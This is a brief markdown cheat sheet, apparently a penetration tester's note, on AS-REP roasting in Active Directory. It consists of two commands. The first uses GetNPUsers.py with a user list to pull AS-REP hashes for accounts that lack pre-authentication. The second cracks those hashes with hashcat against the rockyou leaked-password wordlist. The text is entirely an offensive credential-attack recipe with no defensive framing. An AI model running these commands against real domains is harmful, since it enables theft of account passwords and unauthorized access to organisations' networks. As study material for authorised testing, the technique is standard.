# ActiveDirectory

## AS REP roasting

Create a file with users.txt with usersnames.


```sh
GetNPUsers.py DOMAIN.LOCAL/ -usersfile ./users.txt -k -format hashcat -no-pass -o hashes.txt
```

Crack the AS REP hash with hashcat.

```sh
hashcat -m 18200 -a 0 -o results.txt --remove ./hashes.txt /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

